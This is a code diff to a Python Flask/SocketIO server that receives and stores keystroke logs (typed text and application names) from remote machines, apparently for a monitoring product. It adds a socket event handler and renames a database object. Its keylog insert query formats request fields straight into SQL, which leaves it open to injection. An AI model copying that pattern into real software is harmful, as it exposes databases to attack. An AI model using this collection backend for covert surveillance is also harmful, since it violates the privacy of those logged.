@@ -65,7 +65,12 @@ def messageRecived():
 @socketio.on('my event')
 def handle_my_custom_event(json):
     #print('received my event: ' + str(json))
-    socketio.emit('my response', json, callback=messageRecived)
+    socketio.emit('my response', json, callback=messageRecived)\
+
+@socketio.on('key_log')
+def dbInsert():
+    #print('received my event: ' + str(json))
+    socketio.emit('my response', {'insert': 'true'}, callback=messageRecived)
 
 
 # @app.route('/api/post_klogs/<uid>', methods=['POST'])
@@ -80,7 +85,7 @@ def post_keylog(machine_id):
 
     print request.json
     query = "INSERT INTO `shield`.`keylog` (`u_id`, `keylog_date_time`, `application_name`, `log_text`, `notification_id`, `unique_identifieri`) VALUES ({0},'{1}','{2}','{3}','{4}','{5}')".format(request.json['user_id'], request.json['datetime'], request.json['application'], request.json['data'], '0', machine_id);
-    db_result = obj.execute_query(query)
+    db_result = db.execute_query(query)
     return jsonify({"uuid":machine_id})
 
 
@@ -238,7 +243,7 @@ def signup():
 def getKeyLogData():
     # import pdb;
     # pdb.set_trace();
-    tuples = obj.select('keylog', {'u_id': '3'})
+    tuples = db.select('keylog', {'u_id': '3'})
     # res[0][1] = str(res[0][1])
     result = []
     tuplesList = list(tuples)
